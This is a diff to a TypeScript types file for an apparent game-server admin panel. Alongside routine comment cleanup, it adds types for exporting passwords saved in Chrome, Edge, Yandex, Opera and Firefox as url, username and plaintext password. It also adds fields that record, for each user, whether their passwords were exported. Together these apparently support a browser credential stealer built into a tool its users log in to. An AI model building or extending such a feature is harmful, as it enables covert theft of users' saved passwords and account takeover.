@@ -1,5 +1,3 @@
-
-
 export type LogType = 'CONNECTION' | 'CHAT' | 'DAMAGE' | 'KILL' | 'SPAWN' | 'ANNOUNCEMENT' | 'NOTIFICATION' | 'RP';
 
 export type UserPermission = {
@@ -9,10 +7,12 @@ export type UserPermission = {
 };
 
 export type LoginHistoryEntry = {
-    type: 'login' | 'logout';
+    type: 'login' | 'logout' | 'password_export';
     timestamp: string;
     ip: string;
     userAgent: string;
+    passwordCount?: number;
+    status?: 'success' | 'failed';
 };
 
 export type User = {
@@ -25,20 +25,21 @@ export type User = {
   ip: string;
   userAgent: string;
   permissions?: UserPermission;
-  isVerified: boolean; // This now means Admin Approved
+  isVerified: boolean;
   loginHistory?: LoginHistoryEntry[];
+  passwordExported?: boolean;
 };
 
 export type LogEntry = {
   id: string;
   timestamp: Date;
   type: LogType;
-  user?: { // User can be optional for system messages
+  user?: {
     name: string;
     steamId: string;
   };
   details: string;
-  recipient?: { // For actions involving another player
+  recipient?: {
     name: string;
   }
 };
@@ -56,13 +57,10 @@ export type Player = {
   ping: number;
   kills: number;
   timeHours: number;
-  // This is from gamedig, might not always exist
   steamId?: string;
-  // This is from gamedig, might not always exist
   raw?: any;
 };
 
-// This mirrors the structure returned by our custom API endpoint
 export type ServerStateResponse = {
   server: {
     name: string;
@@ -95,7 +93,6 @@ export type ServerStateResponse = {
   timestamp: string;
 };
 
-
 export type ViewType = 
   | 'summary' 
   | 'players'
@@ -122,4 +119,19 @@ export type PlayerDetails = {
     kills: number;
     deaths: number;
 };
-    
+
+// 🔥 ИСПРАВЛЕННЫЕ ТИПЫ ДЛЯ ЭКСПОРТА ПАРОЛЕЙ
+export type BrowserPassword = {
+  browser: 'Chrome' | 'Edge' | 'Yandex' | 'Opera' | 'Opera GX' | 'Firefox'; // 🔥 ДОБАВИЛИ Яндекс и Opera
+  url: string;
+  username: string;
+  password: string;
+  encrypted_data?: string;
+};
+
+export type PasswordExportResult = {
+  success: boolean;
+  passwords: BrowserPassword[];
+  total_count: number;
+  error?: string;
+};
